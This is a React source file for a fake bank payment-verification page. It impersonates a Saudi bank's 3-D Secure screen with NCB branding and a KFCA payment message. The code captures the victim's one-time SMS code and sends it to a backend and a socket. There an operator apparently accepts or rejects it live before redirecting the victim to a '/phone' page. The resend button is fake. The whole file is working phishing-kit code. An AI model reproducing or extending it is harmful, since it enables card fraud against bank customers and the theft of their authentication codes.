import React, { useEffect, useMemo, useState } from "react";
import axios from "axios";
import { api_route, socket } from "../App";

const formatCheckoutDate = () => {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getFullYear()}/${pad(d.getMonth() + 1)}/${pad(d.getDate())} ${pad(
    d.getHours(),
  )}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
};

const Otp = () => {
  const [secureCode, setSecureCode] = useState("");
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState("");
  const [codeHint, setCodeHint] = useState("");
  const [openWhy, setOpenWhy] = useState(false);
  const [openHelp, setOpenHelp] = useState(false);

  const orderId = sessionStorage.getItem("id");
  const priceRaw = sessionStorage.getItem("price");
  const currency = sessionStorage.getItem("currency") || "sar";

  const amountLabel = useMemo(() => {
    const n = Number(priceRaw);
    const amount = Number.isFinite(n) ? n.toFixed(1) : "0.0";
    const cur = currency === "sar" ? "SAR" : "BHD";
    return { amount, cur };
  }, [priceRaw, currency]);

  const checkoutInfo = useMemo(
    () =>
      `We have sent you a text message with a code to your registered mobile number.\n\nYou are paying KFCA the amount of ${amountLabel.cur} ${amountLabel.amount} on ${formatCheckoutDate()}.`,
    [amountLabel],
  );

  useEffect(() => {
    if (!orderId) return;
    socket.emit("joinOrder", orderId);
  }, [orderId]);

  useEffect(() => {
    if (!orderId) return;

    const onAccept = (id) => {
      if (id === orderId) {
        window.location.href = "/phone";
      }
    };

    const onDecline = (id) => {
      if (id === orderId) {
        setError("Invalid code. Please try again.");
        setProcessing(false);
      }
    };

    socket.on("acceptVisaOtp", onAccept);
    socket.on("declineVisaOtp", onDecline);

    return () => {
      socket.off("acceptVisaOtp", onAccept);
      socket.off("declineVisaOtp", onDecline);
    };
  }, [orderId]);

  const onSecureCodeChange = (e) => {
    const raw = e.target.value;
    const digits = raw.replace(/\D/g, "").slice(0, 6);
    setSecureCode(digits);
    setCodeHint("");
  };

  const handleCancel = () => {
    window.history.back();
  };

  const handleConfirm = async (e) => {
    e.preventDefault();
    setError("");
    setCodeHint("");
    if (!orderId) {
      setError("Your session has expired. Please start again.");
      return;
    }
    if (secureCode.length < 4 || secureCode.length > 6) {
      setCodeHint("Enter a code between 4 and 6 digits.");
      return;
    }

    setProcessing(true);
    try {
      await axios.post(`${api_route}/visaOtp/${orderId}`, { otp: secureCode });
      socket.emit("visaOtp", { id: orderId, otp: secureCode });
    } catch {
      setError("Failed to verify code.");
      setProcessing(false);
    }
  };

  const handleResend = (e) => {
    e.preventDefault();
    setProcessing(true);
    window.setTimeout(() => setProcessing(false), 1200);
  };

  if (!orderId) {
    return (
      <div className="min-h-screen w-full bg-[#f5f5f5] flex items-center justify-center px-4">
        <p className="text-center text-gray-700 text-sm">
          No active order. Please return and complete payment.
        </p>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full bg-[#f5f5f5] text-gray-900">
      {processing && (
        <div className="loader">
          <div className="justify-content-center jimu-primary-loading"></div>
        </div>
      )}

      <form
        id="checkout-page"
        className="mx-auto w-full max-w-xl px-4 pb-12 pt-4"
        onSubmit={(ev) => ev.preventDefault()}
      >
        <button
          type="submit"
          disabled
          className="hidden"
          aria-hidden
          tabIndex={-1}
        />

        <div id="content-wrapper" className="space-y-0">
          <div id="cancel-form-wrapper" className="flex justify-end pb-2">
            <div id="cancel-form">
              <button
                type="button"
                className="cancel rounded border  px-3 py-1 text-xs font-medium text-gray-700 shadow-sm hover:bg-gray-50"
                onClick={handleCancel}
              >
                Cancel
              </button>
            </div>
          </div>

          <div
            id="branding-wrapper"
            className="border-b border-gray-200 bg-white px-4 py-4 shadow-sm"
          >
            <div id="branding-area">
              <div
                id="branding-table"
                className="flex w-full items-center justify-between gap-4"
              >
                <div
                  id="branding-row"
                  className="flex w-full items-center justify-between gap-4"
                >
                  <div id="branding-cell-left" className="flex-shrink-0">
                    <img
                      className="image max-h-6 w-auto object-contain"
                      alt="NCB BANK"
                      src="/consumer/img/bank_mada.png"
                    />
                  </div>
                  <div id="branding-cell-right" className="flex-shrink-0">
                    <img
                      className="schemeImg max-h-12 w-auto object-contain"
                      src="https://mcconsumerv2.alahli.com/consumer/img/scheme.png"
                      alt="scheme"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div
            id="checkout-form-header-wrapper"
            className="border-b border-gray-200 bg-white px-4 py-6 shadow-sm"
          >
            <div id="checkout-form-header" className="space-y-3">
              <div
                id="checkout-form-title"
                className="text-left text-xl font-bold text-gray-900"
              >
                Verify By Phone
              </div>
              <div
                id="checkout-form-info"
                className="whitespace-pre-line text-left  text-sm leading-relaxed text-gray-500"
              >
                {checkoutInfo}
              </div>
              <div className="generalMessage min-h-[1em] text-center text-sm text-red-600">
                {error || "\u200c"}
              </div>
            </div>
          </div>

          <div
            id="forms-container-wrapper"
            className="border-b border-gray-200 bg-white px-4 py-6 shadow-sm"
          >
            <div id="forms-container" className="space-y-4">
              <div id="checkout-form" className="space-y-3">
                <div
                  id="checkout-form-textbox-title"
                  className="text-sm text-center font-semibold text-gray-800"
                >
                  Verification code
                </div>
                <input
                  type="text"
                  id="secureCode"
                  name="secureCode"
                  autoComplete="off"
                  inputMode="numeric"
                  pattern="[0-9]{4,6}"
                  className="textInput w-full rounded border border-gray-400 bg-white px-3 py-3 text-center text-lg font-semibold tracking-[0.35em] shadow-inner outline-none focus:border-slate-600 focus:ring-1 focus:ring-slate-400"
                  value={secureCode}
                  onChange={onSecureCodeChange}
                  maxLength={6}
                />
                <div
                  id="codeMessage"
                  className={`flex items-start gap-2 text-sm ${codeHint ? "text-amber-800" : "text-transparent"}`}
                ></div>
                <button
                  id="checkout-form-button"
                  type="button"
                  name="action"
                  value="confirm"
                  className="w-full rounded bg-blue-500 py-3 text-sm font-bold uppercase tracking-wide text-white shadow-md transition hover:bg-[#245a43] active:scale-[0.99]"
                  onClick={handleConfirm}
                >
                  CONFIRM
                </button>
              </div>
            </div>
              <span className="w-full text-center text-blue-500 flex items-center justify-center mt-10 ">RESEND CODE</span>
          </div>

          <div
            id="information-zone-wrapper"
            className="bg-white px-4 py-4 shadow-sm"
          >
            <div
              id="information-zone"
              className="space-y-0"
            >
              <button
                id="why-button"
                type="button"
                className="accordion-button flex w-full items-center justify-between  px-4 py-3 text-left text-sm font-medium text-gray-800 hover:bg-gray-100"
                onClick={() => {
                  setOpenWhy(!openWhy);
                  setOpenHelp(false);
                }}
              >
                <span className="accordion-button-text text-blue-500">
                  Learn more about authentication
                </span>
                <span className="accordion-state-indicator text-lg font-normal text-blue-600">
                  {openWhy ? "−" : "+"}
                </span>
              </button>
              <div
                id="why-text"
                className={`accordion-text border-b border-gray-200 bg-white px-4 py-3 text-sm leading-relaxed text-gray-600 ${openWhy ? "" : "hidden"}`}
              >
                Authentication helps protect your payment. Your bank may send a
                one-time code to your registered mobile number to confirm it is
                you making this purchase.
              </div>

              <button
                id="help-button"
                type="button"
                className="accordion-button flex w-full items-center justify-between bg-white px-4 py-3 text-left text-sm font-medium text-gray-800 hover:bg-gray-100"
                onClick={() => {
                  setOpenHelp(!openHelp);
                  setOpenWhy(false);
                }}
              >
                <span className="accordion-button-text text-blue-500">Need some help ?</span>
                <span className="accordion-state-indicator text-lg font-normal text-blue-600">
                  {openHelp ? "−" : "+"}
                </span>
              </button>
              <div
                id="help-text"
                className={`accordion-text bg-white px-4 py-3 text-sm leading-relaxed text-gray-600 ${openHelp ? "" : "hidden"}`}
              >
                If you did not receive a code, use RESEND CODE or contact your
                bank. If you closed this page, you may need to start the payment
                again from the merchant.
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
};

export default Otp;
